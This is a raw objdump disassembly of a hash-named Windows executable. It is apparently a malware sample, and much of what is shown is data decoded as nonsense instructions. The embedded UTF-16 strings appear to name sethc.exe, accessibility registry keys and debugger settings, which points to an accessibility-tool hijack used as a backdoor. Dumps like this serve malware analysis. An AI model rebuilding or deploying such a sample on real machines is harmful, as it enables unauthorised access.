
f7df2fc6c007aa22af62210420d1f16df04f3cfd9ada02d29952af3d3783556e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	inc    eax
  401005:	jne    0x401047
  401007:	add    BYTE PTR [eax-0x4fffbfe0],al
  40100d:	and    BYTE PTR [eax+0x0],al
  401010:	shl    BYTE PTR [eax],0x40
  401013:	add    al,ah
  401015:	and    BYTE PTR [eax+0x0],al
	...
  401020:	jo     0x401096
  401022:	inc    eax
  401023:	add    BYTE PTR [eax],ah
  401025:	jns    0x401067
  401027:	add    BYTE PTR [eax],al
  401029:	add    BYTE PTR [eax],al
  40102b:	add    BYTE PTR [eax-0x4fffffe0],al
  401031:	and    BYTE PTR [eax],al
  401033:	add    al,al
  401035:	and    BYTE PTR [eax],al
  401037:	add    al,ah
  401039:	and    BYTE PTR [eax],al
  40103b:	add    al,al
  40103d:	and    al,BYTE PTR [eax]
  40103f:	add    BYTE PTR [eax],dh
  401041:	pop    esp
  401042:	add    BYTE PTR [eax],al
  401044:	mov    al,0x6f
  401046:	add    BYTE PTR [eax],al
  401048:	xor    BYTE PTR [eax+0x0],dh
  40104b:	add    BYTE PTR [eax+0x70],ah
  40104e:	add    BYTE PTR [eax],al
  401050:	shl    BYTE PTR [eax+0x0],1
  401053:	add    al,ah
  401055:	jo     0x401057
  401057:	add    al,dh
  401059:	jo     0x40105b
  40105b:	add    BYTE PTR [eax+0x71],al
  40105e:	add    BYTE PTR [eax],al
  401060:	pusha  
  401061:	jno    0x401063
  401063:	add    BYTE PTR [eax-0x1fffff8f],dl
  401069:	jno    0x40106b
  40106b:	add    BYTE PTR [eax],al
  40106d:	jb     0x40106f
  40106f:	add    BYTE PTR [eax+0x74],dh
  401072:	add    BYTE PTR [eax],al
  401074:	inc    eax
  401075:	jne    0x401077
  401077:	add    BYTE PTR [eax+0x77],al
  40107a:	add    BYTE PTR [eax],al
  40107c:	push   eax
  40107d:	ja     0x40107f
  40107f:	add    al,dl
  401081:	js     0x401083
  401083:	add    BYTE PTR [eax],ah
  401085:	jns    0x401087
  401087:	add    BYTE PTR [eax],al
  401089:	jp     0x40108b
  40108b:	add    BYTE PTR [eax+0x5000007c],dl
  401091:	jle    0x401093
  401093:	add    BYTE PTR [eax],dh
  401095:	xchg   BYTE PTR [eax],al
  401097:	add    BYTE PTR [eax-0x7a],al
  40109a:	add    BYTE PTR [eax],al
  40109c:	push   eax
  40109d:	xchg   BYTE PTR [eax],al
  40109f:	add    BYTE PTR [eax-0x7a],dh
	...
  4010ae:	add    BYTE PTR [eax],al
  4010b0:	and    BYTE PTR [eax+eax*2+0x40947000],dl
  4010b7:	add    BYTE PTR [eax+0x7e],dl
  4010ba:	inc    eax
  4010bb:	add    BYTE PTR [edi+0x0],dl
  4010be:	imul   eax,DWORD PTR [eax],0x6c006e
  4010c4:	outs   dx,DWORD PTR ds:[esi]
  4010c5:	add    BYTE PTR [edi+0x0],ah
  4010c8:	outs   dx,DWORD PTR ds:[esi]
  4010c9:	add    BYTE PTR [esi+0x0],ch
  4010cc:	add    BYTE PTR [eax],al
  4010ce:	add    BYTE PTR [eax],al
  4010d0:	inc    edi
  4010d1:	add    BYTE PTR [eax+eax*1+0x6f],ch
  4010d5:	add    BYTE PTR [edx+0x0],ah
  4010d8:	popa   
  4010d9:	add    BYTE PTR [eax+eax*1+0x5c],ch
  4010dd:	add    BYTE PTR [edi+0x0],dl
  4010e0:	imul   eax,DWORD PTR [eax],0x64006e
  4010e6:	outs   dx,DWORD PTR ds:[esi]
  4010e7:	add    BYTE PTR [edi+0x0],dh
  4010ea:	jae    0x4010ec
  4010ec:	add    BYTE PTR cs:[ebp+0x0],cl
  4010f0:	popa   
  4010f1:	add    BYTE PTR [ebx+0x0],ah
  4010f4:	push   0x6e006900
  4010f9:	add    BYTE PTR [ebp+0x0],ah
  4010fc:	add    BYTE PTR cs:[edi+0x0],cl
  401100:	dec    edi
  401101:	add    BYTE PTR [edx+0x0],al
  401104:	inc    ebp
  401105:	add    BYTE PTR [eax],al
  401107:	add    BYTE PTR ds:0x79005300,ah
  40110d:	add    BYTE PTR [ebx+0x0],dh
  401110:	je     0x401112
  401112:	add    BYTE PTR gs:[ebp+0x0],ch
  401116:	push   edx
  401117:	add    BYTE PTR [edi+0x0],ch
  40111a:	outs   dx,DWORD PTR ds:[esi]
  40111b:	add    BYTE PTR [eax+eax*1+0x25],dh
  40111f:	add    BYTE PTR [eax+eax*1+0x53],bl
  401123:	add    BYTE PTR [ecx+0x0],bh
  401126:	jae    0x401128
  401128:	je     0x40112a
  40112a:	add    BYTE PTR gs:[ebp+0x0],ch
  40112e:	xor    eax,DWORD PTR [eax]
  401130:	xor    al,BYTE PTR [eax]
  401132:	pop    esp
  401133:	add    BYTE PTR [ebx+0x0],dl
  401136:	add    BYTE PTR gs:[eax+eax*1+0x68],dh
  40113b:	add    BYTE PTR [ebx+0x0],ah
  40113e:	add    BYTE PTR cs:[ebp+0x0],ah
  401142:	js     0x401144
  401144:	add    BYTE PTR gs:[eax],al
  401147:	add    BYTE PTR [edi],ch
  401149:	add    BYTE PTR [ecx+0x0],al
  40114c:	arpl   WORD PTR [eax],ax
  40114e:	arpl   WORD PTR [eax],ax
  401150:	add    BYTE PTR gs:[ebx+0x0],dh
  401154:	jae    0x401156
  401156:	imul   eax,DWORD PTR [eax],0x690062
  40115c:	ins    BYTE PTR es:[edi],dx
  40115d:	add    BYTE PTR [ecx+0x0],ch
  401160:	je     0x401162
  401162:	jns    0x401164
  401164:	push   ebx
  401165:	add    BYTE PTR [edi+0x0],ch
  401168:	jne    0x40116a
  40116a:	outs   dx,BYTE PTR ds:[esi]
  40116b:	add    BYTE PTR [eax+eax*1+0x41],ah
  40116f:	add    BYTE PTR [edi+0x0],ah
  401172:	add    BYTE PTR gs:[esi+0x0],ch
  401176:	je     0x401178
  401178:	add    BYTE PTR [eax],al
  40117a:	add    BYTE PTR [eax],al
  40117c:	das    
  40117d:	add    BYTE PTR [eax+0x0],ch
  401180:	popa   
  401181:	add    BYTE PTR [edx+0x0],dh
  401184:	add    BYTE PTR fs:[edi+0x0],dh
  401188:	popa   
  401189:	add    BYTE PTR [edx+0x0],dh
  40118c:	add    BYTE PTR gs:[edx+0x0],ah
  401190:	jne    0x401192
  401192:	je     0x401194
  401194:	je     0x401196
  401196:	outs   dx,DWORD PTR ds:[esi]
  401197:	add    BYTE PTR [esi+0x0],ch
  40119a:	ins    BYTE PTR es:[edi],dx
  40119b:	add    BYTE PTR [ecx+0x0],ah
  40119e:	jne    0x4011a0
  4011a0:	outs   dx,BYTE PTR ds:[esi]
  4011a1:	add    BYTE PTR [ebx+0x0],ah
  4011a4:	push   0x54000000
  4011a9:	add    BYTE PTR [eax+0x0],ch
  4011ac:	add    BYTE PTR gs:[ebp+0x0],ch
  4011b0:	add    BYTE PTR gs:[ebx+0x0],dh
  4011b4:	add    BYTE PTR [eax],al
  4011b6:	add    BYTE PTR [eax],al
  4011b8:	and    eax,0x79005300
  4011bd:	add    BYTE PTR [ebx+0x0],dh
  4011c0:	je     0x4011c2
  4011c2:	add    BYTE PTR gs:[ebp+0x0],ch
  4011c6:	push   edx
  4011c7:	add    BYTE PTR [edi+0x0],ch
  4011ca:	outs   dx,DWORD PTR ds:[esi]
  4011cb:	add    BYTE PTR [eax+eax*1+0x25],dh
  4011cf:	add    BYTE PTR [eax+eax*1+0x52],bl
  4011d3:	add    BYTE PTR [ebp+0x0],ah
  4011d6:	jae    0x4011d8
  4011d8:	outs   dx,DWORD PTR ds:[esi]
  4011d9:	add    BYTE PTR [ebp+0x0],dh
  4011dc:	jb     0x4011de
  4011de:	arpl   WORD PTR [eax],ax
  4011e0:	add    BYTE PTR gs:[ebx+0x0],dh
  4011e4:	pop    esp
  4011e5:	add    BYTE PTR [eax+eax*1+0x68],dl
  4011e9:	add    BYTE PTR [ebp+0x0],ah
  4011ec:	ins    DWORD PTR es:[edi],dx
  4011ed:	add    BYTE PTR [ebp+0x0],ah
  4011f0:	jae    0x4011f2
  4011f2:	pop    esp
  4011f3:	add    BYTE PTR [ecx+0x0],al
  4011f6:	add    BYTE PTR gs:[edx+0x0],dh
  4011fa:	outs   dx,DWORD PTR ds:[esi]
  4011fb:	add    BYTE PTR [eax+eax*1+0x41],bl
  4011ff:	add    BYTE PTR [ebp+0x0],ah
  401202:	jb     0x401204
  401204:	outs   dx,DWORD PTR ds:[esi]
  401205:	add    BYTE PTR [eax+eax*1+0x69],cl
  401209:	add    BYTE PTR [eax+eax*1+0x65],dh
  40120d:	add    BYTE PTR [esi],ch
  40120f:	add    BYTE PTR [ebp+0x0],ch
  401212:	jae    0x401214
  401214:	jae    0x401216
  401216:	je     0x401218
  401218:	jns    0x40121a
  40121a:	ins    BYTE PTR es:[edi],dx
  40121b:	add    BYTE PTR [ebp+0x0],ah
  40121e:	jae    0x401220
  401220:	add    BYTE PTR [eax],al
  401222:	add    BYTE PTR [eax],al
  401224:	dec    esi
  401225:	add    BYTE PTR [edi+0x0],ch
  401228:	jb     0x40122a
  40122a:	ins    DWORD PTR es:[edi],dx
  40122b:	add    BYTE PTR [ecx+0x0],ah
  40122e:	ins    BYTE PTR es:[edi],dx
  40122f:	add    BYTE PTR [ebx+0x0],dl
  401232:	imul   eax,DWORD PTR [eax],0x65007a
  401238:	add    BYTE PTR [eax],al
  40123a:	add    BYTE PTR [eax],al
  40123c:	dec    esi
  40123d:	add    BYTE PTR [edi+0x0],ch
  401240:	jb     0x401242
  401242:	ins    DWORD PTR es:[edi],dx
  401243:	add    BYTE PTR [ecx+0x0],ah
  401246:	ins    BYTE PTR es:[edi],dx
  401247:	add    BYTE PTR [ebx+0x0],al
  40124a:	outs   dx,DWORD PTR ds:[esi]
  40124b:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40124f:	add    BYTE PTR [edx+0x0],dh
  401252:	add    BYTE PTR [eax],al
  401254:	das    
  401255:	add    BYTE PTR [ebx+0x0],dh
  401258:	je     0x40125a
  40125a:	popa   
  40125b:	add    BYTE PTR [edx+0x0],dh
  40125e:	je     0x401260
  401260:	add    BYTE PTR [eax],al
  401262:	add    BYTE PTR [eax],al
  401264:	das    
  401265:	add    BYTE PTR [ebx+0x0],ah
  401268:	outs   dx,DWORD PTR ds:[esi]
  401269:	add    BYTE PTR [eax+0x0],dh
  40126c:	jns    0x40126e
  40126e:	add    BYTE PTR [eax],al
  401270:	dec    esi
  401271:	add    BYTE PTR [ecx+0x0],ah
  401274:	jb     0x401276
  401276:	jb     0x401278
  401278:	popa   
  401279:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40127d:	add    BYTE PTR [edx+0x0],dh
  401280:	add    BYTE PTR [eax],al
  401282:	add    BYTE PTR [eax],al
  401284:	push   ebx
  401285:	mov    eax,ebx
  401287:	pop    ebx
  401288:	dec    edx
  401289:	mov    ds:0x6ca8421c,al
  40128e:	pop    es
  40128f:	imul   esi,DWORD PTR [eax+0x7d0e637],0x7e4565c
  401299:	xchg   esp,eax
  40129a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40129b:	push   esi
  40129c:	push   cs
  40129d:	in     eax,0xf5
  40129f:	cmp    ah,al
  4012a1:	outs   dx,BYTE PTR ds:[esi]
  4012a2:	sbb    ecx,esp
  4012a4:	dec    esp
  4012a5:	add    BYTE PTR [ecx+0x0],ah
  4012a8:	jne    0x4012aa
  4012aa:	outs   dx,BYTE PTR ds:[esi]
  4012ab:	add    BYTE PTR [ebx+0x0],ah
  4012ae:	push   0x54004100
  4012b3:	add    BYTE PTR [eax],al
  4012b5:	add    BYTE PTR [eax],al
  4012b7:	add    BYTE PTR [ebx+0x0],dl
  4012ba:	dec    edi
  4012bb:	add    BYTE PTR [esi+0x0],al
  4012be:	push   esp
  4012bf:	add    BYTE PTR [edi+0x0],dl
  4012c2:	inc    ecx
  4012c3:	add    BYTE PTR [edx+0x0],dl
  4012c6:	inc    ebp
  4012c7:	add    BYTE PTR [eax+eax*1+0x4d],bl
  4012cb:	add    BYTE PTR [ecx+0x0],ch
  4012ce:	arpl   WORD PTR [eax],ax
  4012d0:	jb     0x4012d2
  4012d2:	outs   dx,DWORD PTR ds:[esi]
  4012d3:	add    BYTE PTR [ebx+0x0],dh
  4012d6:	outs   dx,DWORD PTR ds:[esi]
  4012d7:	add    BYTE PTR [esi+0x0],ah
  4012da:	je     0x4012dc
  4012dc:	pop    esp
  4012dd:	add    BYTE PTR [edi+0x0],dl
  4012e0:	imul   eax,DWORD PTR [eax],0x64006e
  4012e6:	outs   dx,DWORD PTR ds:[esi]
  4012e7:	add    BYTE PTR [edi+0x0],dh
  4012ea:	jae    0x4012ec
  4012ec:	and    BYTE PTR [eax],al
  4012ee:	dec    esi
  4012ef:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4012f3:	add    BYTE PTR [ebx+0x0],al
  4012f6:	jne    0x4012f8
  4012f8:	jb     0x4012fa
  4012fa:	jb     0x4012fc
  4012fc:	add    BYTE PTR gs:[esi+0x0],ch
  401300:	je     0x401302
  401302:	push   esi
  401303:	add    BYTE PTR [ebp+0x0],ah
  401306:	jb     0x401308
  401308:	jae    0x40130a
  40130a:	imul   eax,DWORD PTR [eax],0x6e006f
  401310:	pop    esp
  401311:	add    BYTE PTR [ecx+0x0],al
  401314:	arpl   WORD PTR [eax],ax
  401316:	arpl   WORD PTR [eax],ax
  401318:	add    BYTE PTR gs:[ebx+0x0],dh
  40131c:	jae    0x40131e
  40131e:	imul   eax,DWORD PTR [eax],0x690062
  401324:	ins    BYTE PTR es:[edi],dx
  401325:	add    BYTE PTR [ecx+0x0],ch
  401328:	je     0x40132a
  40132a:	jns    0x40132c
  40132c:	pop    esp
  40132d:	add    BYTE PTR [ebx+0x0],dl
  401330:	ins    BYTE PTR es:[edi],dx
  401331:	add    BYTE PTR [ecx+0x0],ah
  401334:	je     0x401336
  401336:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40133b:	add    BYTE PTR [ebp+0x0],dh
  40133e:	outs   dx,BYTE PTR ds:[esi]
  40133f:	add    BYTE PTR [ebx+0x0],ah
  401342:	push   0x0
  401347:	add    BYTE PTR [ebx+0x0],al
  40134a:	outs   dx,DWORD PTR ds:[esi]
  40134b:	add    BYTE PTR [esi+0x0],ch
  40134e:	je     0x401350
  401350:	jb     0x401352
  401352:	outs   dx,DWORD PTR ds:[esi]
  401353:	add    BYTE PTR [eax+eax*1+0x20],ch
  401357:	add    BYTE PTR [eax+0x0],dl
  40135a:	popa   
  40135b:	add    BYTE PTR [esi+0x0],ch
  40135e:	add    BYTE PTR gs:[eax+eax*1+0x5c],ch
  401363:	add    BYTE PTR [ecx+0x0],al
  401366:	arpl   WORD PTR [eax],ax
  401368:	arpl   WORD PTR [eax],ax
  40136a:	add    BYTE PTR gs:[ebx+0x0],dh
  40136e:	jae    0x401370
  401370:	imul   eax,DWORD PTR [eax],0x690062
  401376:	ins    BYTE PTR es:[edi],dx
  401377:	add    BYTE PTR [ecx+0x0],ch
  40137a:	je     0x40137c
  40137c:	jns    0x40137e
  40137e:	pop    esp
  40137f:	add    BYTE PTR [ebx+0x0],dl
  401382:	ins    BYTE PTR es:[edi],dx
  401383:	add    BYTE PTR [ecx+0x0],ah
  401386:	je     0x401388
  401388:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40138d:	add    BYTE PTR [ebp+0x0],dh
  401390:	outs   dx,BYTE PTR ds:[esi]
  401391:	add    BYTE PTR [ebx+0x0],ah
  401394:	push   0x5c00
  401399:	add    BYTE PTR [eax],al
  40139b:	add    BYTE PTR [ecx+0x0],al
  40139e:	push   esp
  40139f:	add    BYTE PTR [ecx+0x0],ah
  4013a2:	jo     0x4013a4
  4013a4:	jo     0x4013a6
  4013a6:	add    BYTE PTR [eax],al
  4013a8:	mov    al,0x6f
  4013aa:	inc    eax
  4013ab:	add    BYTE PTR [eax],dh
  4013ad:	jo     0x4013ef
  4013af:	add    BYTE PTR [eax+0x70],ah
  4013b2:	inc    eax
  4013b3:	add    al,dl
  4013b5:	jo     0x4013f7
  4013b7:	add    al,ah
  4013b9:	jo     0x4013fb
  4013bb:	add    al,dh
  4013bd:	jo     0x4013ff
  4013bf:	add    BYTE PTR [eax+0x71],al
  4013c2:	inc    eax
  4013c3:	add    BYTE PTR [eax+0x71],ah
  4013c6:	inc    eax
  4013c7:	add    BYTE PTR [eax-0x1fffbf8f],dl
  4013cd:	jno    0x40140f
  4013cf:	add    BYTE PTR [eax],al
  4013d1:	jb     0x401413
  4013d3:	add    BYTE PTR [eax],al
  4013d5:	add    BYTE PTR [eax],al
  4013d7:	add    BYTE PTR [ebx+0x0],dl
  4013da:	outs   dx,DWORD PTR ds:[esi]
  4013db:	add    BYTE PTR [esi+0x0],ah
  4013de:	je     0x4013e0
  4013e0:	ja     0x4013e2
  4013e2:	popa   
  4013e3:	add    BYTE PTR [edx+0x0],dh
  4013e6:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4013eb:	add    BYTE PTR [ecx+0x0],ch
  4013ee:	arpl   WORD PTR [eax],ax
  4013f0:	jb     0x4013f2
  4013f2:	outs   dx,DWORD PTR ds:[esi]
  4013f3:	add    BYTE PTR [ebx+0x0],dh
  4013f6:	outs   dx,DWORD PTR ds:[esi]
  4013f7:	add    BYTE PTR [esi+0x0],ah
  4013fa:	je     0x4013fc
  4013fc:	pop    esp
  4013fd:	add    BYTE PTR [edi+0x0],dl
  401400:	imul   eax,DWORD PTR [eax],0x64006e
  401406:	outs   dx,DWORD PTR ds:[esi]
  401407:	add    BYTE PTR [edi+0x0],dh
  40140a:	jae    0x40140c
  40140c:	and    BYTE PTR [eax],al
  40140e:	dec    esi
  40140f:	add    BYTE PTR [eax+eax*1+0x5c],dl
  401413:	add    BYTE PTR [ebx+0x0],al
  401416:	jne    0x401418
  401418:	jb     0x40141a
  40141a:	jb     0x40141c
  40141c:	add    BYTE PTR gs:[esi+0x0],ch
  401420:	je     0x401422
  401422:	push   esi
  401423:	add    BYTE PTR [ebp+0x0],ah
  401426:	jb     0x401428
  401428:	jae    0x40142a
  40142a:	imul   eax,DWORD PTR [eax],0x6e006f
  401430:	pop    esp
  401431:	add    BYTE PTR [ecx+0x0],al
  401434:	arpl   WORD PTR [eax],ax
  401436:	arpl   WORD PTR [eax],ax
  401438:	add    BYTE PTR gs:[ebx+0x0],dh
  40143c:	jae    0x40143e
  40143e:	imul   eax,DWORD PTR [eax],0x690062
  401444:	ins    BYTE PTR es:[edi],dx
  401445:	add    BYTE PTR [ecx+0x0],ch
  401448:	je     0x40144a
  40144a:	jns    0x40144c
  40144c:	pop    esp
  40144d:	add    BYTE PTR [ecx+0x0],al
  401450:	push   esp
  401451:	add    BYTE PTR [ebx+0x0],dh
  401454:	pop    esp
  401455:	add    BYTE PTR [eax],al
  401457:	add    BYTE PTR [ecx+0x0],al
  40145a:	jo     0x40145c
  40145c:	jo     0x40145e
  40145e:	ins    BYTE PTR es:[edi],dx
  40145f:	add    BYTE PTR [ecx+0x0],ch
  401462:	arpl   WORD PTR [eax],ax
  401464:	popa   
  401465:	add    BYTE PTR [eax+eax*1+0x69],dh
  401469:	add    BYTE PTR [edi+0x0],ch
  40146c:	outs   dx,BYTE PTR ds:[esi]
  40146d:	add    BYTE PTR [esi+0x0],cl
  401470:	popa   
  401471:	add    BYTE PTR [ebp+0x0],ch
  401474:	add    BYTE PTR gs:[eax],al
  401477:	add    BYTE PTR [eax+eax*1+0x65],al
  40147b:	add    BYTE PTR [ebx+0x0],dh
  40147e:	arpl   WORD PTR [eax],ax
  401480:	jb     0x401482
  401482:	imul   eax,DWORD PTR [eax],0x740070
  401488:	imul   eax,DWORD PTR [eax],0x6e006f
  40148e:	add    BYTE PTR [eax],al
  401490:	push   ebx
  401491:	add    BYTE PTR [eax+eax*1+0x61],dh
  401495:	add    BYTE PTR [edx+0x0],dh
  401498:	je     0x40149a
  40149a:	inc    ebp
  40149b:	add    BYTE PTR [eax+0x0],bh
  40149e:	add    BYTE PTR gs:[eax],al
  4014a1:	add    BYTE PTR [eax],al
  4014a3:	add    BYTE PTR [ebx+0x0],dl
  4014a6:	je     0x4014a8
  4014a8:	popa   
  4014a9:	add    BYTE PTR [edx+0x0],dh
  4014ac:	je     0x4014ae
  4014ae:	push   eax
  4014af:	add    BYTE PTR [ecx+0x0],ah
  4014b2:	jb     0x4014b4
  4014b4:	popa   
  4014b5:	add    BYTE PTR [ebp+0x0],ch
  4014b8:	jae    0x4014ba
  4014ba:	add    BYTE PTR [eax],al
  4014bc:	push   ebx
  4014bd:	add    BYTE PTR [ecx+0x0],ch
  4014c0:	ins    DWORD PTR es:[edi],dx
  4014c1:	add    BYTE PTR [eax+0x0],dh
  4014c4:	ins    BYTE PTR es:[edi],dx
  4014c5:	add    BYTE PTR [ebp+0x0],ah
  4014c8:	push   eax
  4014c9:	add    BYTE PTR [edx+0x0],dh
  4014cc:	outs   dx,DWORD PTR ds:[esi]
  4014cd:	add    BYTE PTR [esi+0x0],ah
  4014d0:	imul   eax,DWORD PTR [eax],0x65006c
  4014d6:	add    BYTE PTR [eax],al
  4014d8:	push   eax
  4014d9:	add    BYTE PTR [edx+0x0],dh
  4014dc:	outs   dx,DWORD PTR ds:[esi]
  4014dd:	add    BYTE PTR [esi+0x0],ah
  4014e0:	imul   eax,DWORD PTR [eax],0x65006c
  4014e6:	add    BYTE PTR [eax],al
  4014e8:	inc    ecx
  4014e9:	add    BYTE PTR [eax+eax*1+0x45],dl
  4014ed:	add    BYTE PTR [eax+0x0],bh
  4014f0:	add    BYTE PTR gs:[eax],al
  4014f3:	add    BYTE PTR [eax+eax*1+0x65],dl
  4014f7:	add    BYTE PTR [edx+0x0],dh
  4014fa:	ins    DWORD PTR es:[edi],dx
  4014fb:	add    BYTE PTR [ecx+0x0],ch
  4014fe:	outs   dx,BYTE PTR ds:[esi]
  4014ff:	add    BYTE PTR [ecx+0x0],ah
  401502:	je     0x401504
  401504:	add    BYTE PTR gs:[edi+0x0],cl
  401508:	outs   dx,BYTE PTR ds:[esi]
  401509:	add    BYTE PTR [eax+eax*1+0x65],al
  40150d:	add    BYTE PTR [ebx+0x0],dh
  401510:	imul   eax,DWORD PTR [eax],0x74
  401513:	add    BYTE PTR [edi+0x0],ch
  401516:	jo     0x401518
  401518:	push   ebx
  401519:	add    BYTE PTR [edi+0x0],dh
  40151c:	imul   eax,DWORD PTR [eax],0x630074
  401522:	push   0x0
  401527:	add    BYTE PTR [ebx+0x0],al
  40152a:	outs   dx,DWORD PTR ds:[esi]
  40152b:	add    BYTE PTR [eax+0x0],dh
  40152e:	jns    0x401530
  401530:	push   ebx
  401531:	add    BYTE PTR [ebp+0x0],ah
  401534:	je     0x401536
  401536:	je     0x401538
  401538:	imul   eax,DWORD PTR [eax],0x67006e
  40153e:	jae    0x401540
  401540:	push   esp
  401541:	add    BYTE PTR [edi+0x0],ch
  401544:	dec    esp
  401545:	add    BYTE PTR [edi+0x0],ch
  401548:	arpl   WORD PTR [eax],ax
  40154a:	imul   eax,DWORD PTR [eax],0x65
  40154d:	add    BYTE PTR [eax+eax*1+0x44],ah
  401551:	add    BYTE PTR [ebp+0x0],ah
  401554:	jae    0x401556
  401556:	imul   eax,DWORD PTR [eax],0x74
  401559:	add    BYTE PTR [edi+0x0],ch
  40155c:	jo     0x40155e
  40155e:	add    BYTE PTR [eax],al
  401560:	push   ebx
  401561:	add    BYTE PTR [ebp+0x0],ah
  401564:	arpl   WORD PTR [eax],ax
  401566:	jne    0x401568
  401568:	jb     0x40156a
  40156a:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  40156f:	add    BYTE PTR [ebx+0x0],dh
  401572:	imul   eax,DWORD PTR [eax],0x74
  401575:	add    BYTE PTR [edi+0x0],ch
  401578:	jo     0x40157a
  40157a:	inc    ecx
  40157b:	add    BYTE PTR [ebx+0x0],ah
  40157e:	arpl   WORD PTR [eax],ax
  401580:	outs   dx,DWORD PTR ds:[esi]
  401581:	add    BYTE PTR [ebp+0x0],ch
  401584:	ins    DWORD PTR es:[edi],dx
  401585:	add    BYTE PTR [edi+0x0],ch
  401588:	add    BYTE PTR fs:[ecx+0x0],ah
  40158c:	je     0x40158e
  40158e:	imul   eax,DWORD PTR [eax],0x6e006f
  401594:	add    BYTE PTR [eax],al
  401596:	add    BYTE PTR [eax],al
  401598:	push   ebx
  401599:	add    BYTE PTR [ecx+0x0],bh
  40159c:	jae    0x40159e
  40159e:	je     0x4015a0
  4015a0:	add    BYTE PTR gs:[ebp+0x0],ch
  4015a4:	push   ebx
  4015a5:	add    BYTE PTR [ebp+0x0],ah
  4015a8:	je     0x4015aa
  4015aa:	je     0x4015ac
  4015ac:	imul   eax,DWORD PTR [eax],0x67006e
  4015b2:	add    BYTE PTR [eax],al
  4015b4:	add    BYTE PTR [eax],al
  4015b6:	add    BYTE PTR [eax],al
  4015b8:	sub    BYTE PTR [eax],al
  4015ba:	outs   dx,BYTE PTR ds:[esi]
  4015bb:	add    BYTE PTR [ebp+0x0],dh
  4015be:	ins    BYTE PTR es:[edi],dx
  4015bf:	add    BYTE PTR [eax+eax*1+0x29],ch
  4015c3:	add    BYTE PTR [eax],al
  4015c5:	add    BYTE PTR [eax],al
  4015c7:	add    BYTE PTR [eax+eax*1],bh
  4015ca:	dec    esi
  4015cb:	add    BYTE PTR [ebp+0x0],dl
  4015ce:	dec    esp
  4015cf:	add    BYTE PTR [eax+eax*1+0x3e],cl
  4015d3:	add    BYTE PTR [eax],al
  4015d5:	add    BYTE PTR [eax],al
  4015d7:	add    BYTE PTR [esi+0x0],cl
  4015da:	push   ebp
  4015db:	add    BYTE PTR [eax+eax*1+0x4c],cl
  4015df:	add    BYTE PTR [eax],al
  4015e1:	add    BYTE PTR [eax],al
  4015e3:	add    BYTE PTR [ebx+0x0],dl
  4015e6:	je     0x4015e8
  4015e8:	popa   
  4015e9:	add    BYTE PTR [edx+0x0],dh
  4015ec:	je     0x4015ee
  4015ee:	dec    esp
  4015ef:	add    BYTE PTR [ecx+0x0],ch
  4015f2:	jae    0x4015f4
  4015f4:	je     0x4015f6
  4015f6:	cmp    al,BYTE PTR [eax]
  4015f8:	cmp    al,BYTE PTR [eax]
  4015fa:	push   ebx
  4015fb:	add    BYTE PTR [ecx+0x0],ah
  4015fe:	jbe    0x401600
  401600:	add    BYTE PTR gs:[ebx+0x0],dl
  401604:	add    BYTE PTR gs:[ebx+0x0],dh
  401608:	jae    0x40160a
  40160a:	imul   eax,DWORD PTR [eax],0x6e006f
  401610:	dec    ebx
  401611:	add    BYTE PTR [ebp+0x0],ah
  401614:	jns    0x401616
  401616:	add    BYTE PTR [eax],al
  401618:	sub    al,0x0
  40161a:	add    BYTE PTR [eax],al
  40161c:	push   ebx
  40161d:	add    BYTE PTR [eax+eax*1+0x61],dh
  401621:	add    BYTE PTR [edx+0x0],dh
  401624:	je     0x401626
  401626:	dec    esp
  401627:	add    BYTE PTR [ecx+0x0],ch
  40162a:	jae    0x40162c
  40162c:	je     0x40162e
  40162e:	cmp    al,BYTE PTR [eax]
  401630:	cmp    al,BYTE PTR [eax]
  401632:	inc    ebx
  401633:	add    BYTE PTR [edx+0x0],dh
  401636:	add    BYTE PTR gs:[ecx+0x0],ah
  40163a:	je     0x40163c
  40163c:	add    BYTE PTR gs:[ecx+0x0],al
  401640:	push   esp
  401641:	add    BYTE PTR [eax+0x0],dl
  401644:	jb     0x401646
  401646:	outs   dx,DWORD PTR ds:[esi]
  401647:	add    BYTE PTR [ebx+0x0],ah
  40164a:	add    BYTE PTR gs:[ebx+0x0],dh
  40164e:	jae    0x401650
  401650:	add    BYTE PTR [eax],al
  401652:	add    BYTE PTR [eax],al
  401654:	and    eax,0x20007300
  401659:	add    BYTE PTR ds:0x7300,ah
  40165f:	add    BYTE PTR ds:0x20007300,ah
  401665:	add    BYTE PTR [edi],ch
  401667:	add    BYTE PTR [ebx+0x0],dh
  40166a:	je     0x40166c
  40166c:	popa   
  40166d:	add    BYTE PTR [edx+0x0],dh
  401670:	je     0x401672
  401672:	and    BYTE PTR [eax],al
  401674:	and    eax,0x20007300
  401679:	add    BYTE PTR ds:0x7300,ah
  40167f:	add    BYTE PTR [ebx+0x0],dl
  401682:	dec    edi
  401683:	add    BYTE PTR [esi+0x0],al
  401686:	push   esp
  401687:	add    BYTE PTR [edi+0x0],dl
  40168a:	inc    ecx
  40168b:	add    BYTE PTR [edx+0x0],dl
  40168e:	inc    ebp
  40168f:	add    BYTE PTR [eax+eax*1+0x4d],bl
  401693:	add    BYTE PTR [ecx+0x0],ch
  401696:	arpl   WORD PTR [eax],ax
  401698:	jb     0x40169a
  40169a:	outs   dx,DWORD PTR ds:[esi]
  40169b:	add    BYTE PTR [ebx+0x0],dh
  40169e:	outs   dx,DWORD PTR ds:[esi]
  40169f:	add    BYTE PTR [esi+0x0],ah
  4016a2:	je     0x4016a4
  4016a4:	pop    esp
  4016a5:	add    BYTE PTR [edi+0x0],dl
  4016a8:	imul   eax,DWORD PTR [eax],0x64006e
  4016ae:	outs   dx,DWORD PTR ds:[esi]
  4016af:	add    BYTE PTR [edi+0x0],dh
  4016b2:	jae    0x4016b4
  4016b4:	and    BYTE PTR [eax],al
  4016b6:	dec    esi
  4016b7:	add    BYTE PTR [eax+eax*1+0x5c],dl
  4016bb:	add    BYTE PTR [ebx+0x0],al
  4016be:	jne    0x4016c0
  4016c0:	jb     0x4016c2
  4016c2:	jb     0x4016c4
  4016c4:	add    BYTE PTR gs:[esi+0x0],ch
  4016c8:	je     0x4016ca
  4016ca:	push   esi
